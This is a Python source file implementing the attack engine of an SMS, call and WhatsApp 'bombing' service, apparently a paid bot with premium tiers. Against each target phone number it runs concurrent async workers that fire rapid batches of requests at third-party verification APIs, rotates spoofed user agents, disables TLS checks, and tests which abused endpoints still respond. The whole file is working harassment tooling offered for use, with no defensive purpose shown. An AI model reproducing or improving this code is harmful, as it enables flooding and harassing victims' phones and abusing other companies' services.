"""
Attack Manager - handles all bombing tasks
"""
import ssl
import time
import random
import asyncio
import logging
from datetime import datetime

import aiohttp

from apis import ALL_APIS

logger = logging.getLogger(__name__)


# ============================================================
# API Lists by category
# ============================================================
SMS_API_LIST = [a for a in ALL_APIS if "voice" not in a.get("name", "").lower()
                and "call" not in a.get("name", "").lower()
                and "whatsapp" not in a.get("name", "").lower()]
CALL_API_LIST = [a for a in ALL_APIS if "voice" in a.get("name", "").lower()
                 or "call" in a.get("name", "").lower()]
WA_API_LIST = [a for a in ALL_APIS if "whatsapp" in a.get("name", "").lower()]


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
    "okhttp/3.9.1",
    "okhttp/5.0.0-alpha.2",
]


class AttackManager:
    def __init__(self, db):
        self.db = db
        self.active_attacks = {}
        self._session = None
        self._connector = None
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

    async def _get_session(self):
        if self._session is None or self._session.closed:
            self._connector = aiohttp.TCPConnector(
                ssl=self.ssl_context,
                limit=200,
                limit_per_host=30,
                ttl_dns_cache=300,
                enable_cleanup_closed=True,
            )
            timeout = aiohttp.ClientTimeout(total=20, connect=8, sock_read=15)
            self._session = aiohttp.ClientSession(
                connector=self._connector, timeout=timeout
            )
        return self._session

    async def _close_session(self):
        if self._session and not self._session.closed:
            await self._session.close()
        if self._connector and not self._connector.closed:
            await self._connector.close()
        self._session = None
        self._connector = None

    def _fill(self, template, phone):
        """Replace {no}/{phone} placeholders in any object"""
        if isinstance(template, str):
            return template.replace("{no}", phone).replace("{phone}", phone)
        if isinstance(template, dict):
            return {k: self._fill(v, phone) for k, v in template.items()}
        if isinstance(template, list):
            return [self._fill(v, phone) for v in template]
        return template

    async def _make_request(self, api, phone):
        """Fire a single API request"""
        try:
            session = await self._get_session()

            # URL can be callable or string
            url = api["url"]
            if callable(url):
                url = url(phone)

            headers = dict(api.get("headers", {}))
            if "User-Agent" not in headers:
                headers["User-Agent"] = random.choice(USER_AGENTS)

            body = self._fill(api.get("body"), phone)
            method = api["method"].upper()

            if method == "GET":
                async with session.get(url, headers=headers) as resp:
                    await resp.read()
            elif method == "PUT":
                if isinstance(body, dict):
                    async with session.put(url, headers=headers, json=body) as resp:
                        await resp.read()
                else:
                    async with session.put(url, headers=headers, data=body or "") as resp:
                        await resp.read()
            else:  # POST
                if isinstance(body, dict):
                    async with session.post(url, headers=headers, json=body) as resp:
                        await resp.read()
                elif isinstance(body, str):
                    async with session.post(url, headers=headers, data=body) as resp:
                        await resp.read()
                else:
                    async with session.post(url, headers=headers) as resp:
                        await resp.read()
            return True
        except Exception:
            return False

    async def _worker(self, user_id, phone, api_chunk, end_time, category="sms"):
        """Background worker loop"""
        while time.time() < end_time:
            attack = self.active_attacks.get(user_id)
            if not attack or not attack.get("running"):
                break
            if phone not in attack.get("targets", []):
                break

            batch_size = min(40, len(api_chunk))
            batch = random.sample(api_chunk, batch_size) if len(api_chunk) > batch_size else api_chunk
            tasks = [self._make_request(api, phone) for api in batch]
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.03)

    async def start_attack(self, user_id, targets, duration_minutes):
        """Begin a new attack"""
        if user_id in self.active_attacks:
            return False, "⚠️ Attack already running. Use /status"

        if not await self.db.is_premium(user_id):
            return False, "⛔ Premium required"

        max_dur = await self.db.get_max_duration(user_id)
        if duration_minutes > max_dur:
            return False, f"Max duration is {max_dur} minutes"

        concurrency = await self.db.get_concurrent_limit(user_id)
        if concurrency == 0:
            return False, "⛔ Premium required"
        if len(targets) > concurrency:
            return False, f"Max {concurrency} concurrent targets"

        for target in targets:
            if await self.db.is_protected(target):
                return False, f"🛡 {target} is protected!"

        end_time = time.time() + (duration_minutes * 60)

        # How many workers per target
        workers_per_target = 6
        all_apis = ALL_APIS

        self.active_attacks[user_id] = {
            "targets": targets,
            "end_time": end_time,
            "running": True,
            "workers": {},
            "started_at": datetime.now().isoformat(),
        }

        # Split APIs into chunks
        chunk_size = max(1, len(all_apis) // workers_per_target)
        chunks = []
        for i in range(workers_per_target):
            s = i * chunk_size
            e = s + chunk_size if i < workers_per_target - 1 else len(all_apis)
            chunks.append(all_apis[s:e])

        for target in targets:
            self.active_attacks[user_id]["workers"][target] = []
            for chunk in chunks:
                task = asyncio.create_task(
                    self._worker(user_id, target, chunk, end_time)
                )
                self.active_attacks[user_id]["workers"][target].append(task)

        return True, f"🚀 Attack started for {len(targets)} target(s)"

    async def stop_attack(self, user_id):
        """Stop an active attack"""
        if user_id not in self.active_attacks:
            return False

        self.active_attacks[user_id]["running"] = False
        for workers in self.active_attacks[user_id].get("workers", {}).values():
            for t in workers:
                if not t.done():
                    t.cancel()

        await asyncio.sleep(0.5)
        del self.active_attacks[user_id]
        return True

    def is_attacking(self, user_id):
        return user_id in self.active_attacks

    def get_attack_info(self, user_id):
        return self.active_attacks.get(user_id)

    async def check_apis(self, phone="9999999999", max_check=200):
        """Ping APIs and return working ones"""
        working = []
        failed = []
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=50)
        timeout = aiohttp.ClientTimeout(total=8, connect=4)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            subset = ALL_APIS[:max_check]
            for api in subset:
                try:
                    url = api["url"]
                    if callable(url):
                        url = url(phone)
                    headers = dict(api.get("headers", {}))
                    headers.setdefault("User-Agent", random.choice(USER_AGENTS))
                    body = self._fill(api.get("body"), phone)
                    method = api["method"].upper()

                    if method == "GET":
                        async with session.get(url, headers=headers) as resp:
                            (working if resp.status < 500 else failed).append(api["name"])
                    elif method == "PUT":
                        async with session.put(url, headers=headers, json=body) as resp:
                            (working if resp.status < 500 else failed).append(api["name"])
                    else:
                        if isinstance(body, dict):
                            async with session.post(url, headers=headers, json=body) as resp:
                                (working if resp.status < 500 else failed).append(api["name"])
                        else:
                            async with session.post(url, headers=headers, data=body or "") as resp:
                                (working if resp.status < 500 else failed).append(api["name"])
                except Exception:
                    failed.append(api["name"])
        return working, failed
